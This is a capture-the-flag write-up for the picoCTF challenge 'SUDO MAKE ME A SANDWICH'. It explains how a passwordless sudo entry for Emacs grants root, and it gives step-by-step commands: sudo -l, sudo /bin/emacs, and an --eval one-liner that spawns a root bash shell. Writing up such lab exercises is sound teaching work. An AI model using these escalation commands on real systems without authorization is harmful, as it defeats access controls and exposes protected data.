# SUDO MAKE ME A SANDWICH - picoCTF 2026

**Category:** General Skills
**Points:** 50

## Challenge Description

Can you read the flag? I think you can!

## Approach

This challenge teaches **Linux privilege escalation** through misconfigured `sudo` permissions. You are given SSH access to a machine where a `flag.txt` file exists but is only readable by root. The key is discovering that the current user can run `/bin/emacs` as root via `sudo` without needing a password.

Emacs is a powerful text editor that includes a built-in shell. When launched as root via `sudo`, any shell spawned from within Emacs also runs as root, giving full access to the filesystem.

### The Vulnerability

The system has a misconfigured `/etc/sudoers` entry that allows the challenge user to run Emacs as root without a password:

```
ctf-player ALL=(root) NOPASSWD: /bin/emacs
```

This is a well-known privilege escalation vector documented on [GTFOBins](https://gtfobins.github.io/gtfobins/emacs/). If a user can run Emacs as root, they can:
1. Open a root shell from within Emacs
2. Read/write any file on the system
3. Effectively become root

### Tools Used

- **SSH**: To connect to the challenge machine
- **sudo -l**: To enumerate sudo privileges
- **Emacs**: To escalate privileges via its built-in shell

## Solution

### Step 1: Connect via SSH

Use the credentials provided by the challenge to log in:

```bash
ssh ctf-player@challenge-host -p PORT
# Enter the provided password when prompted
```

### Step 2: Enumerate the Environment

```bash
whoami              # Shows current user (e.g., ctf-player)
ls -la              # Lists files, shows flag.txt owned by root
cat flag.txt        # Permission denied - need root access
```

### Step 3: Check Sudo Privileges

```bash
sudo -l
```

This reveals that the user can run `/bin/emacs` as root without a password:

```
User ctf-player may run the following commands on challenge:
    (root) NOPASSWD: /bin/emacs
```

### Step 4: Escalate Privileges via Emacs

```bash
sudo /bin/emacs
```

Once Emacs opens:
1. Press `Alt+X` (or `M-x` in Emacs notation) to open the command prompt
2. Type `shell` and press Enter
3. A shell opens running as root

Alternatively, use Emacs in non-interactive mode to read the file directly:

```bash
sudo /bin/emacs -nw flag.txt
```

Or spawn a shell directly without the full Emacs UI:

```bash
sudo /bin/emacs -Q -nw --eval '(term "/bin/bash")'
```

### Step 5: Read the Flag

From the root shell inside Emacs:

```bash
cat /home/ctf-player/flag.txt
```

Or if you opened the file directly in Emacs, the flag is displayed in the editor buffer.

## Solution Script

```
python3 solve.py
```

## Flag

```
picoCTF{...}  (placeholder - actual flag varies per instance)
```
